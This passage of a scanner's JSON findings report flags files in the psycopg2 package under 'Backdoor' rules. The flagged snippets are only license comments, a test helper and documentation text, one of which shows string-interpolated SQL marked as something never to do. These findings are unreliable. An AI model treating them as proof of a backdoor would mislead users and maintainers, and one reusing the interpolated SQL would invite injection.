            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_replication.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_lobject.py"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 69,
                  "endLine": 39,
                  "endColumn": 73,
                  "snippet": {
                    "text": "\n\ndef skip_if_no_lo(f):\n    f = skip_before_postgres(8, 1, \"large objects only supported from PG 8.1\")(f)\n    f = skip_if_green(\"libpq doesn't support LO in async mode\")(f)\n    f = skip_if_crdb(\"large objects\")(f)\n    return f\n",
                    "rendered": {
                      "text": "\n\ndef skip_if_no_lo(f):\n    f = skip_before_postgres(8, 1, \"large objects only supported from PG 8.1\")(f)\n    f = skip_if_green(\"libpq doesn't support LO in async mode\")(f)\n    f = skip_if_crdb(\"large objects\")(f)\n    return f\n",
                      "markdown": "`\n\ndef skip_if_no_lo(f):\n    f = skip_before_postgres(8, 1, \"large objects only supported from PG 8.1\")(f)\n    f = skip_if_green(\"libpq doesn't support LO in async mode\")(f)\n    f = skip_if_crdb(\"large objects\")(f)\n    return f\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_lobject.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_lobject.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 1051,
                  "startColumn": 27,
                  "endLine": 1051,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    - the Python build is 64 bits;\n    - the extension was built against at least libpq 9.3;\n    - the server version is at least PostgreSQL 9.3\n      (`~connection.server_version` must be >= ``90300``).\n\n    If Psycopg was built with 64 bits large objects support (i.e. the first\n",
                    "rendered": {
                      "text": "\n    - the Python build is 64 bits;\n    - the extension was built against at least libpq 9.3;\n    - the server version is at least PostgreSQL 9.3\n      (`~connection.server_version` must be >= ``90300``).\n\n    If Psycopg was built with 64 bits large objects support (i.e. the first\n",
                      "markdown": "`\n    - the Python build is 64 bits;\n    - the extension was built against at least libpq 9.3;\n    - the server version is at least PostgreSQL 9.3\n      (`~connection.server_version` must be >= ``90300``).\n\n    If Psycopg was built with 64 bits large objects support (i.e. the first\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 1050,
                  "startColumn": 37,
                  "endLine": 1050,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    enabled only if all the following conditions are verified:\n\n    - the Python build is 64 bits;\n    - the extension was built against at least libpq 9.3;\n    - the server version is at least PostgreSQL 9.3\n      (`~connection.server_version` must be >= ``90300``).\n\n",
                    "rendered": {
                      "text": "    enabled only if all the following conditions are verified:\n\n    - the Python build is 64 bits;\n    - the extension was built against at least libpq 9.3;\n    - the server version is at least PostgreSQL 9.3\n      (`~connection.server_version` must be >= ``90300``).\n\n",
                      "markdown": "`    enabled only if all the following conditions are verified:\n\n    - the Python build is 64 bits;\n    - the extension was built against at least libpq 9.3;\n    - the server version is at least PostgreSQL 9.3\n      (`~connection.server_version` must be >= ``90300``).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 886,
                  "startColumn": 60,
                  "endLine": 886,
                  "endColumn": 64,
                  "snippet": {
                    "text": "Named cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\nyou may decrease this value if you are dealing with huge records.\n",
                    "rendered": {
                      "text": "Named cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\nyou may decrease this value if you are dealing with huge records.\n",
                      "markdown": "`Named cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\nyou may decrease this value if you are dealing with huge records.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 885,
                  "startColumn": 6,
                  "endLine": 885,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\nNamed cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\n",
                    "rendered": {
                      "text": "\nNamed cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\n",
                      "markdown": "`\nNamed cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 747,
                  "startColumn": 12,
                  "endLine": 748,
                  "snippet": {
                    "text": "\n.. _transactions-control:\n\nTransactions control\n--------------------\n\nIn Psycopg transactions are handled by the `connection` class. By\ndefault, the first time a command is sent to the database (using one of the\n",
                    "rendered": {
                      "text": "\n.. _transactions-control:\n\nTransactions control\n--------------------\n\nIn Psycopg transactions are handled by the `connection` class. By\ndefault, the first time a command is sent to the database (using one of the\n",
                      "markdown": "`\n.. _transactions-control:\n\nTransactions control\n--------------------\n\nIn Psycopg transactions are handled by the `connection` class. By\ndefault, the first time a command is sent to the database (using one of the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 528,
                  "startColumn": 65,
                  "endLine": 528,
                  "endColumn": 69,
                  "snippet": {
                    "text": "   Since version 9.0 PostgreSQL uses by default `a new \"hex\" format`__ to\n   emit :sql:`bytea` fields. Starting from Psycopg 2.4.1 the format is\n   correctly supported.  If you use a previous version you will need some\n   extra care when receiving bytea from PostgreSQL: you must have at least\n   libpq 9.0 installed on the client or alternatively you can set the\n   `bytea_output`__ configuration parameter to ``escape``, either in the\n   server configuration file or in the client session (using a query such as\n",
                    "rendered": {
                      "text": "   Since version 9.0 PostgreSQL uses by default `a new \"hex\" format`__ to\n   emit :sql:`bytea` fields. Starting from Psycopg 2.4.1 the format is\n   correctly supported.  If you use a previous version you will need some\n   extra care when receiving bytea from PostgreSQL: you must have at least\n   libpq 9.0 installed on the client or alternatively you can set the\n   `bytea_output`__ configuration parameter to ``escape``, either in the\n   server configuration file or in the client session (using a query such as\n",
                      "markdown": "`   Since version 9.0 PostgreSQL uses by default `a new \"hex\" format`__ to\n   emit :sql:`bytea` fields. Starting from Psycopg 2.4.1 the format is\n   correctly supported.  If you use a previous version you will need some\n   extra care when receiving bytea from PostgreSQL: you must have at least\n   libpq 9.0 installed on the client or alternatively you can set the\n   `bytea_output`__ configuration parameter to ``escape``, either in the\n   server configuration file or in the client session (using a query such as\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 21,
                  "endLine": 214,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    Never, **never**, **NEVER** use Python string concatenation (``+``) or\n    string parameters interpolation (``%``) to pass variables to a SQL query\n    string.  Not even at gunpoint.\n\nThe correct way to pass variables in a SQL command is using the second\nargument of the `~cursor.execute()` method::\n",
                    "rendered": {
                      "text": "\n    Never, **never**, **NEVER** use Python string concatenation (``+``) or\n    string parameters interpolation (``%``) to pass variables to a SQL query\n    string.  Not even at gunpoint.\n\nThe correct way to pass variables in a SQL command is using the second\nargument of the `~cursor.execute()` method::\n",
                      "markdown": "`\n    Never, **never**, **NEVER** use Python string concatenation (``+``) or\n    string parameters interpolation (``%``) to pass variables to a SQL query\n    string.  Not even at gunpoint.\n\nThe correct way to pass variables in a SQL command is using the second\nargument of the `~cursor.execute()` method::\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 189,
                  "startColumn": 34,
                  "endLine": 189,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    >>> SQL = \"INSERT INTO authors (name) VALUES ('%s');\" # NEVER DO THIS\n    >>> data = (\"O'Reilly\", )\n    >>> cur.execute(SQL % data) # THIS WILL FAIL MISERABLY\n    ProgrammingError: syntax error at or near \"Reilly\"\n    LINE 1: INSERT INTO authors (name) VALUES ('O'Reilly')\n                                                  ^\n\n",
                    "rendered": {
                      "text": "    >>> SQL = \"INSERT INTO authors (name) VALUES ('%s');\" # NEVER DO THIS\n    >>> data = (\"O'Reilly\", )\n    >>> cur.execute(SQL % data) # THIS WILL FAIL MISERABLY\n    ProgrammingError: syntax error at or near \"Reilly\"\n    LINE 1: INSERT INTO authors (name) VALUES ('O'Reilly')\n                                                  ^\n\n",
                      "markdown": "`    >>> SQL = \"INSERT INTO authors (name) VALUES ('%s');\" # NEVER DO THIS\n    >>> data = (\"O'Reilly\", )\n    >>> cur.execute(SQL % data) # THIS WILL FAIL MISERABLY\n    ProgrammingError: syntax error at or near \"Reilly\"\n    LINE 1: INSERT INTO authors (name) VALUES ('O'Reilly')\n                                                  ^\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 446,
                  "startColumn": 30,
                  "endLine": 446,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'unicode'> u'\\xe0\\xe8\\xec\\xf2\\xf9\\u20ac'\n\nIn the above example, the `~psycopg2.extensions.UNICODE` typecaster is\nregistered only on the cursor. It is also possible to register typecasters on\n",
                    "rendered": {
                      "text": "    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'unicode'> u'\\xe0\\xe8\\xec\\xf2\\xf9\\u20ac'\n\nIn the above example, the `~psycopg2.extensions.UNICODE` typecaster is\nregistered only on the cursor. It is also possible to register typecasters on\n",
                      "markdown": "`    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'unicode'> u'\\xe0\\xe8\\xec\\xf2\\xf9\\u20ac'\n\nIn the above example, the `~psycopg2.extensions.UNICODE` typecaster is\nregistered only on the cursor. It is also possible to register typecasters on\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 434,
                  "startColumn": 18,
                  "endLine": 434,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(type(x), repr(x))\n    <type 'str'> '\\xe0\\xe8\\xec\\xf2\\xf9\\xa4'\n\nIn Python 3 instead the strings are automatically *decoded* in the connection\n`~connection.encoding`, as the `!str` object can represent Unicode characters.\n",
                    "rendered": {
                      "text": "    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(type(x), repr(x))\n    <type 'str'> '\\xe0\\xe8\\xec\\xf2\\xf9\\xa4'\n\nIn Python 3 instead the strings are automatically *decoded* in the connection\n`~connection.encoding`, as the `!str` object can represent Unicode characters.\n",
                      "markdown": "`    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(type(x), repr(x))\n    <type 'str'> '\\xe0\\xe8\\xec\\xf2\\xf9\\xa4'\n\nIn Python 3 instead the strings are automatically *decoded* in the connection\n`~connection.encoding`, as the `!str` object can represent Unicode characters.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 427,
                  "startColumn": 25,
                  "endLine": 427,
                  "endColumn": 77,
                  "snippet": {
                    "text": "    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'str'> '\\xc3\\xa0\\xc3\\xa8\\xc3\\xac\\xc3\\xb2\\xc3\\xb9\\xe2\\x82\\xac'\n\n    >>> conn.set_client_encoding('LATIN9')\n\n",
                    "rendered": {
                      "text": "    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'str'> '\\xc3\\xa0\\xc3\\xa8\\xc3\\xac\\xc3\\xb2\\xc3\\xb9\\xe2\\x82\\xac'\n\n    >>> conn.set_client_encoding('LATIN9')\n\n",
                      "markdown": "`    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'str'> '\\xc3\\xa0\\xc3\\xa8\\xc3\\xac\\xc3\\xb2\\xc3\\xb9\\xe2\\x82\\xac'\n\n    >>> conn.set_client_encoding('LATIN9')\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 427,
                  "startColumn": 25,
                  "endLine": 427,
                  "endColumn": 77,
                  "snippet": {
                    "text": "    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'str'> '\\xc3\\xa0\\xc3\\xa8\\xc3\\xac\\xc3\\xb2\\xc3\\xb9\\xe2\\x82\\xac'\n\n    >>> conn.set_client_encoding('LATIN9')\n\n",
                    "rendered": {
                      "text": "    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'str'> '\\xc3\\xa0\\xc3\\xa8\\xc3\\xac\\xc3\\xb2\\xc3\\xb9\\xe2\\x82\\xac'\n\n    >>> conn.set_client_encoding('LATIN9')\n\n",
                      "markdown": "`    >>> cur.execute(\"SELECT data FROM test WHERE num = 74\")\n    >>> x = cur.fetchone()[0]\n    >>> print(x, type(x), repr(x))\n    àèìòù€ <type 'str'> '\\xc3\\xa0\\xc3\\xa8\\xc3\\xac\\xc3\\xb2\\xc3\\xb9\\xe2\\x82\\xac'\n\n    >>> conn.set_client_encoding('LATIN9')\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 886,
                  "startColumn": 63,
                  "endLine": 887,
                  "snippet": {
                    "text": "Named cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\nyou may decrease this value if you are dealing with huge records.\n\n",
                    "rendered": {
                      "text": "Named cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\nyou may decrease this value if you are dealing with huge records.\n\n",
                      "markdown": "`Named cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\nyou may decrease this value if you are dealing with huge records.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 885,
                  "startColumn": 9,
                  "endLine": 885,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\nNamed cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\n",
                    "rendered": {
                      "text": "\nNamed cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\n",
                      "markdown": "`\nNamed cursors are also :ref:`iterable <cursor-iterable>` like regular cursors.\nNote however that before Psycopg 2.4 iteration was performed fetching one\nrecord at time from the backend, resulting in a large overhead. The attribute\n`~cursor.itersize` now controls how many records are fetched at time\nduring the iteration: the default value of 2000 allows to fetch about 100KB\nper roundtrip assuming records of 10-20 columns of mixed number and strings;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 751,
                  "startColumn": 18,
                  "endLine": 751,
                  "endColumn": 24,
                  "snippet": {
                    "text": "--------------------\n\nIn Psycopg transactions are handled by the `connection` class. By\ndefault, the first time a command is sent to the database (using one of the\n`cursor`\\ s created by the connection), a new transaction is created.\nThe following database commands will be executed in the context of the same\ntransaction -- not only the commands issued by the first cursor, but the ones\n",
                    "rendered": {
                      "text": "--------------------\n\nIn Psycopg transactions are handled by the `connection` class. By\ndefault, the first time a command is sent to the database (using one of the\n`cursor`\\ s created by the connection), a new transaction is created.\nThe following database commands will be executed in the context of the same\ntransaction -- not only the commands issued by the first cursor, but the ones\n",
                      "markdown": "`--------------------\n\nIn Psycopg transactions are handled by the `connection` class. By\ndefault, the first time a command is sent to the database (using one of the\n`cursor`\\ s created by the connection), a new transaction is created.\nThe following database commands will be executed in the context of the same\ntransaction -- not only the commands issued by the first cursor, but the ones\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 646,
                  "endLine": 647,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\n\n.. _time-handling:\n\nTime handling\n'''''''''''''\n\nThe PostgreSQL :sql:`time` and Python `~datetime.time` types are not\n",
                    "rendered": {
                      "text": "\n\n.. _time-handling:\n\nTime handling\n'''''''''''''\n\nThe PostgreSQL :sql:`time` and Python `~datetime.time` types are not\n",
                      "markdown": "`\n\n.. _time-handling:\n\nTime handling\n'''''''''''''\n\nThe PostgreSQL :sql:`time` and Python `~datetime.time` types are not\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
